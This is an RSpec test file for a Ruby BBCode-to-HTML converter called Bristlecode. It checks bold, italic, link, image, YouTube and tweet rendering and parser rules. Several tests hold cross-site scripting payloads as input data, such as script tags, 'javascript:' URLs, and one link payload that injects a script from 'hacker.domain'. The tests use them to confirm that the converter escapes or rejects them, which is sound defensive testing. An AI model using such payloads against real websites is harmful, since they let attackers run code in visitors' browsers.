require 'parslet/rig/rspec'
require_relative '../../bristlecode.rb'

module Bristlecode

  describe '.to_html' do

    def to_html(text)
      Bristlecode.to_html(text)
    end

    def sanitize_html(text)
      Bristlecode.sanitize_html(text)
    end

    it 'leaves an empty string unchanged' do
      expect(to_html("")).to eq("")
    end

    it 'handles empty documents' do
      text = "      \t   \n    \n     \t"
      expect(to_html(text)).to eq(text)
    end

    it 'handles special chars' do
      expect(to_html('&')).to eq('&amp;')
      expect(to_html('>')).to eq('&gt;')
      expect(to_html('<')).to eq('&lt;')
    end

    it 'escapes tags' do
      input = '<script>alert(1)</script>'
      output = '&lt;script&gt;alert(1)&lt;/script&gt;'
      expect(to_html(input)).to eq(output)
    end

    it 'entirely removes unapproved script tags in sanitization' do
      input = '<script>alert(1)</script>'
      expect(sanitize_html(input)).to eq('')
    end

    it 'handles plain text just fine' do
      expect(to_html("plaintext")).to eq("plaintext")
    end

    it 'can bold stuff' do
      expect(to_html("[b]bold[/b]")).to eq("<b>bold</b>")
    end

    it 'can italic stuff' do
      expect(to_html("[i]italic[/i]")).to eq("<i>italic</i>")
    end

    it 'can nest tags' do
      doc = '[b] bold [i] italic [/i] bold [/b]'
      expected = '<b> bold <i> italic </i> bold </b>'
      out = to_html(doc)
      expect(out).to eq(expected)

      doc = '[i] italic [b] bold [/b] italic [/i]'
      expected = '<i> italic <b> bold </b> italic </i>'
      out = to_html(doc)
      expect(out).to eq(expected)
    end

    it 'auto-closes tags at eof' do
      expect(to_html("[b]bold")).to eq("<b>bold</b>")
      expect(to_html("[i]italic")).to eq("<i>italic</i>")
    end

    it 'can render simple links' do
      input = '[url]http://example.com[/url]'
      output = '<a href="http://example.com" rel="nofollow">http://example.com</a>'
      expect(to_html(input)).to eq(output)
    end

    it 'trims whitespace around urls' do
      input = '[url]    http://example.com    [/url]'
      output = '<a href="http://example.com" rel="nofollow">http://example.com</a>'
      expect(to_html(input)).to eq(output)
    end

    it 'passes simple url contents opaquely' do
      input = '[url]http://x[b]y[/b]z[/url]'
      output = '<a href="http://x%5Bb%5Dy%5B/b%5Dz" rel="nofollow">http://x[b]y[/b]z</a>'
      expect(to_html(input)).to eq(output)
    end

    it 'handles urls with titles' do
      input = '[url=http://google.com]the google[/url]'
      output = '<a href="http://google.com" rel="nofollow">the google</a>'
      expect(to_html(input)).to eq(output)
    end

    it 'ignores url tags with bad protocols' do
      input = '[url=javascript:alert(1)]google.com[/url]'
      expect(to_html(input)).to eq(input)

      input = '[url=ftp://something.com/filez]google.com[/url]'
      expect(to_html(input)).to eq(input)
    end

    it 'allows subtrees in <a> tags' do
      input = '[url=http://google.com]this is [b]the[/b] google[/url]'
      output = '<a href="http://google.com" rel="nofollow">this is <b>the</b> google</a>'
      expect(to_html(input)).to eq(output)
    end

    it 'rejects bad url protocols' do
      input = "[url=javascript:t=document.createElement('script');t.src='//hacker.domain/script.js';document.body.appendChild(t);//]test[/url]"
      expect(to_html(input)).to eq(input)

      input = "[url=ftp://whatever.com/etc]warez[/url]"
      expect(to_html(input)).to eq(input)
    end

    it 'renders a linebreak' do
      expect(to_html('[br]')).to eq('<br>')
    end

    it 'renders an image' do
      input = '[img]http://example.com/cat.gif[/img]'
      expect(to_html(input)).to eq('<img src="http://example.com/cat.gif">')
    end

    it 'ignores bad image src protocols' do
      input = '[img]javascript:alert(1)[/img]'
      expect(to_html(input)).to eq(input)

      input = '[img]ftp://example.com/cat.gif[/img]'
      expect(to_html(input)).to eq(input)
    end

    it 'returns the original text on parse failure' do
      input = '[img]http://example.com/dog.gif[img]http://example.com/cat.gif[/img][/img]'
      expect(to_html(input)).to eq(input)

      input = '[url][url]x[/url][/url]'
      expect(to_html(input)).to eq(input)
    end

    it 'can render a youtube video with a watch link' do
      input = '[youtube]https://youtube.com/watch?v=uxpDa-c-4Mc[/youtube]'
      output = '<iframe width="560" height="315" src="https://www.youtube.com/embed/uxpDa-c-4Mc" frameborder="0" allowfullscreen=""></iframe>'
      expect(to_html(input)).to eq(output)

      input = '[youtube]https://www.youtube.com/watch?v=uxpDa-c-4Mc[/youtube]'
      output = '<iframe width="560" height="315" src="https://www.youtube.com/embed/uxpDa-c-4Mc" frameborder="0" allowfullscreen=""></iframe>'
      expect(to_html(input)).to eq(output)
    end

    it 'can render a youtube video with a share link' do
      input = '[youtube]https://youtu.be/uxpDa-c-4Mc[/youtube]'
      output = '<iframe width="560" height="315" src="https://www.youtube.com/embed/uxpDa-c-4Mc" frameborder="0" allowfullscreen=""></iframe>'
      expect(to_html(input)).to eq(output)
    end

    it 'refuses bad youtube urls' do
      input = '[youtube]http://example.com/cats.gif[/youtube]'
      expect(to_html(input)).to eq(input)
    end

    it "requires full url for youtube vids" do
      input = '[youtube]dQw4w9WgXcQ[/youtube]'
      expect(to_html(input)).to eq(input)
    end

    it 'can render a tweet' do
      input = '[tweet]https://twitter.com/jordanorelli/status/662654098156748800[/tweet]'
      output = '<blockquote class="twitter-tweet"><a href="https://twitter.com/jordanorelli/status/662654098156748800" rel="nofollow"></a></blockquote><script src="//platform.twitter.com/widgets.js" charset="utf-8"></script>'
      expect(to_html(input)).to eq(output)
    end

    it 'requres the full url for a tweet' do
      input = '[tweet]662654098156748800[/tweet]'
      expect(to_html(input)).to eq(input)
    end
  end

  describe Parser do
    let(:parser) { Parser.new }

    describe '#parse' do
      it 'can parse an empty string' do
        expect(parser).to parse('')
      end

      it 'can parse whitespace' do
        expect(parser).to parse('      ')
      end

      it 'can parse plain text' do
        expect(parser).to parse('this is some plain text')
      end
    end

    describe '#bold' do
      it 'can parse correct bold text syntax' do
        expect(parser.bold).to parse('[b]bolded contents here[/b]')
        expect(parser.bold).to parse('[b]bolded contents here[/B]')
        expect(parser.bold).to parse('[B]bolded contents here[/b]')
        expect(parser.bold).to parse('[B]bolded contents here[/B]')
      end

      it 'can parse an empty bold tag' do
        expect(parser.bold).to parse('[b][/b]')
      end

      it 'can parse nested tags' do
        expect(parser.bold).to parse('[b] one [b] two [/b] three [/b]')
        expect(parser.bold).to parse('[b] one [i] two [/i] three [/b]')
      end

      it 'can parse an unclosed tag' do
        expect(parser.bold).to parse('[b]bolded contents here')
        expect(parser.bold).to parse('[B]bolded contents here')
      end

      it 'fails non-bold text' do
        expect(parser.bold).not_to parse('this is not bold')
      end

      it 'fails dangling close tags' do
        expect(parser.bold).not_to parse('before [/b] after')
      end

      it 'fails nonsense tag' do
        expect(parser.bold).not_to parse('[bold]fake content[/bold]')
      end
    end

    describe '#italic' do
      it 'can parse correct italic text syntax' do
        expect(parser.italic).to parse('[i]italiced contents here[/i]')
        expect(parser.italic).to parse('[i]italiced contents here[/I]')
        expect(parser.italic).to parse('[I]italiced contents here[/i]')
        expect(parser.italic).to parse('[I]italiced contents here[/I]')
      end

      it 'can parse an empty italic tag' do
        expect(parser.italic).to parse('[i][/i]')
      end

      it 'can parse nested tags' do
        expect(parser.italic).to parse('[i] one [i] two [/i] three [/i]')
        expect(parser.italic).to parse('[i] one [b] two [/b] three [/i]')
      end

      it 'can parse an unclosed tag' do
        expect(parser.italic).to parse('[i]italiced contents here')
        expect(parser.italic).to parse('[I]italiced contents here')
      end

      it 'fails non-italic text' do
        expect(parser.italic).not_to parse('this is not italic')
      end

      it 'fails dangling close tags' do
        expect(parser.italic).not_to parse('before [/i] after')
      end

      it 'fails nonsense tag' do
        expect(parser.italic).not_to parse('[italic]fake content[/italic]')
      end
    end

    describe '#url' do
      it 'can parse correct urls' do
        expect(parser.url).to parse('[url]google.com[/url]')
        expect(parser.url).to parse('[url=google.com]google[/url]')
      end

      it 'can parse title subtrees' do
        expect(parser.url).to parse('[url=google.com]this is [b]google[/b] yo[/url]')
      end

      it "doesn't die on elements nested in simple urls" do
        expect(parser.url).to parse('[url]goog[b]le.c[/b]om[/url]')
      end

      it 'fails nested [url] tags' do
        expect(parser.url).not_to parse('[url]x[url]y[/url]z[/url]')
      end
    end

    describe '#linebreak' do
      it 'does its thing' do
        expect(parser.linebreak).to parse('[br]')
      end
    end

    describe '#img' do
      it 'accepts valid image urls' do
        expect(parser.img).to parse('[img]http://example.com/something.gif[/img]')
        expect(parser.img).to parse('[img]https://example.com/something.gif[/img]')
      end
    end
  end
end
